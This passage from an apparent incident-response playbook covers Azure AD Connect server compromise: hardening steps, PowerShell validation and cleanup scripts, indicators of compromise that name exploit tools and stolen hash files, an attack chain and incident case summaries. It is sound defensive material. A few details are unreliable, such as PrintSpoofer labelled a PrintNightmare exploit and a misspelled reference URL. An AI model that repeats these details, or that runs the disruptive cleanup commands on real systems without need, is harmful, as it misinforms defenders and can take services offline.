1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
3. Enable: **Turn On Virtualization Based Security**
4. Set: **Credential Guard Configuration** to **Enabled with UEFI lock**
5. Run `gpupdate /force`

---

**Mitigation 7: Implement Privileged Access Management (PAM)**

Require approval and monitoring for all administrative actions.

**Manual Steps (Azure PIM):**
1. Go to **Azure Portal** → **Privileged Identity Management**
2. Select **Azure Resources** → **Manage**
3. Find the Azure AD Connect server resource
4. Configure role **settings** to:
   - Require approval for activation
   - Require MFA
   - Set maximum activation duration to 4 hours
   - Require business justification

---

### Validation Command (Verify Mitigations)

```powershell
# Verify patches applied
$RequiredPatches = @("KB5004442", "KB5014005", "KB5024263")  # PrintNightmare, CLFS, recent critical
Get-HotFix | Where-Object {$_.HotFixID -in $RequiredPatches} | Select-Object HotFixID, InstalledDate

# Expected Output: All patches listed with installation dates

# Verify Print Spooler disabled
Get-Service -Name Spooler | Select-Object Name, Status, StartType
# Expected: Status=Stopped, StartType=Disabled

# Verify firewall rules
Get-NetFirewallRule -DisplayName "*RDP*" | Select-Object DisplayName, Direction, Action, Enabled
# Expected: Only jumphost rule enabled
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\Temp\PrintSpoofer.exe`, `GodPotato.exe`, `JuicyPotato.exe`
- `C:\Windows\Temp\captured_hashes.txt` (password hash exfiltration)
- `C:\Program Files\Microsoft Azure AD Sync\Extensions\malicious*.dll` (injected DLL)
- `C:\Windows\System32\drivers\etc\config\sync_*.ps1` (hidden backdoor script)
- Recently modified ADSync configuration files (`ADSync.mdb`)

**Registry:**
- `HKLM\System\CurrentControlSet\Services\ADSync*` (modified service configuration)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\*ADSync*` (suspicious run keys)
- HKLM Proxy settings pointing to attacker infrastructure

**Network:**
- Outbound HTTPS connections from Azure AD Connect to non-Microsoft IP addresses
- DNS queries to attacker-controlled domains
- Connections to ports 445, 389 at unusual times/frequencies
- Service Bus Relay connections with unusual volume

**Cloud (Azure AD):**
- `AuditLogs` - Unexpected user creation by Sync_* account
- `AuditLogs` - Unauthorized role assignments
- `SigninLogs` - Logons from Sync_* account at unusual locations

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event IDs 4688 (process creation), 4697 (service install), 4657 (registry modify)
- `C:\Program Files\Microsoft Azure AD Sync\Logs\` – ADSync service logs
- `C:\Windows\Temp\` – Temporary exploit files, captured hashes
- MFT entries for suspicious executable creation/modification

**Memory:**
- SYSTEM privilege token in miiserver.exe process
- Injected DLL loaded in ADSync process memory
- Captured password hash data structures

**Cloud:**
- **Azure AD Audit Logs** – All operations by Sync_* account
- **Microsoft Entra Health** – Sync service errors/anomalies
- **Sign-in Logs** – Authentication patterns from Sync account

---

### Response Procedures

**1. Immediate Containment:**

**Command:**
```powershell
# Stop ADSync service
Stop-Service -Name ADSync -Force

# Disable Azure AD Connect server network access
# (Remove from network or disable network adapter)
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Disable all suspicious services
@("ADSyncMaintenance", "Spooler", "RemoteRegistry") | ForEach-Object {
  Stop-Service -Name $_ -ErrorAction SilentlyContinue
  Set-Service -Name $_ -StartupType Disabled
}

# Revoke all tokens in Azure AD
Connect-AzureAD
Get-AzureADDirectoryRole | ForEach-Object {
  Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Revoke-AzureADUserAllRefreshToken
}
```

---

**2. Eradicate Malware:**

**Command:**
```powershell
# Remove malicious scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskName -like "*ADSync*" -or $_.TaskName -like "*Maintenance*"} | Unregister-ScheduledTask -Confirm:$false

# Remove malicious services
Get-WmiObject Win32_Service | Where-Object {$_.Name -like "*Persistence*" -or $_.Name -like "*Backdoor*"} | `
  ForEach-Object {$_.Delete()}

# Remove injected DLLs
Remove-Item "C:\Program Files\Microsoft Azure AD Sync\Extensions\malicious*" -Force

# Remove registry persistence
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "*ADSync*" -Force
```

---

**3. Rebuild Azure AD Connect:**

**Command:**
```powershell
# Complete removal and reinstallation of Azure AD Connect

# 1. Backup current configuration
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Sync*"} | Export-ScheduledTask | Out-File "sync_tasks_backup.xml"

# 2. Uninstall Azure AD Connect
$UninstallApp = Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like "*Azure AD Connect*"}
$UninstallApp.Uninstall()

# 3. Delete remaining files and configuration
Remove-Item "C:\Program Files\Microsoft Azure AD Sync\" -Recurse -Force
Remove-Item "C:\ProgramData\Microsoft\Azure AD Sync\" -Recurse -Force

# 4. Reset MSOL and Sync account passwords
Set-ADAccountPassword -Identity "MSOL_aadds123456" -NewPassword (ConvertTo-SecureString "$(New-Guid)!@#$%^&*" -AsPlainText -Force) -Reset

# 5. Reinstall Azure AD Connect from fresh media
# Download latest version from Microsoft and reinstall following security hardening guidelines

# 6. Re-enable Azure AD Connect service with new credentials
Start-Service -Name ADSync

# 7. Monitor for sync issues
Start-ADSyncSyncCycle -PolicyType Initial
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains initial RDP credentials via phishing |
| **2** | **Privilege Escalation** | **[PERSIST-VALID-003]** | **Attacker escalates to local admin on Azure AD Connect server** |
| **3** | **Credential Access** | [CA-TOKEN-002] Azure AD Connect Credential Extraction | Attacker extracts all sync account credentials |
| **4** | **Persistence** | [PERSIST-VALID-002] Azure AD Connect Sync Persistence | Attacker creates permanent cloud backdoor accounts |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker deploys ransomware using cloud admin access |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: MERCURY Attack (2023) - Azure AD Connect Server Compromise

**Target:** Energy and manufacturing sectors  
**Timeline:** March - April 2023  
**Technique Status:** Attackers compromised Azure AD Connect server and extracted all credentials  
**Impact:** **Tens of millions in ransom demands**, complete environment encryption

**Attack Chain:**
1. Phishing campaign targeting IT staff
2. **RDP access to Azure AD Connect server obtained**
3. **Local privilege escalation via PrintNightmare**
4. **MSOL and Sync account credentials extracted**
5. **DCSync attack to extract domain hashes**
6. **Cloud backdoor admin accounts created**
7. Ransomware deployed across 500+ endpoints simultaneously

**Reference:** [Microsoft Security Blog - MERCURY Attack](https://www.microsoft.com/en-us/security/blog/2023/04/07/mercury-and-dev-1084-destructive-attack-on-hybrid-environment/)

---

### Example 2: Sygnia Research - Azure AD Connect Password Hash Sync Hooking (2024)

**Target:** Enterprise security research and testing  
**Timeline:** 2024  
**Technique Status:** Researchers demonstrated real-time password hash capture via DLL injection  
**Impact:** **Proof-of-concept of indefinite persistence mechanism**

**Attack Chain:**
1. Local admin access to Azure AD Connect server (via privilege escalation)
2. **DLL injection into miiserver.exe process**
3. **Hooking of password sync functions**
4. **Real-time capture of password hashes for all users**
5. Password hashes exfiltrated daily via scheduled task
6. Indefinite persistence independent of credential rotation

**Reference:** [Sygnia - Guarding the Bridge: Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)

---

### Example 3: APT29 (Cozy Bear) - Hybrid Infrastructure Takeover

**Target:** U.S. Government agencies  
**Timeline:** 2020-2021  
**Technique Status:** Used Azure AD Connect server compromise as secondary persistence mechanism  
**Impact:** **9+ months of undetected presence in hybrid environment**

**Attack Chain:**
1. Initial compromise via spear-phishing
2. Lateral movement to network infrastructure
3. **Discovery and compromise of Azure AD Connect server**
4. **Local privilege escalation using available exploits**
5. **Complete credential extraction from sync service**
6. Created permanent cloud-based persistence mechanisms
7. Maintained access even after initial compromise was discovered

**Reference:** [Microsoft - APT29 Deep Dive Analysis](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solwinds-compromise/)

---

## References & External Resources

- [Microsoft - Protect M365 from On-Premises Attacks](https://learn.microsoft.com/en-us/entra/architecture/protect-m365-from-on-premises-attacks)
- [Sygnia - Guarding the Bridge: Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)
- [PrintSpoofer GitHub - PrintNightmare Exploitation](https://github.com/itm4n/PrintSpoofer)
- [Certipy - AD CS Exploitation Tool](https://github.com/ly4k/Certipy)
- [Microsoft - Azure AD Connect Security Best Practices](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)
- [MITRE ATT&CK - Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)

---

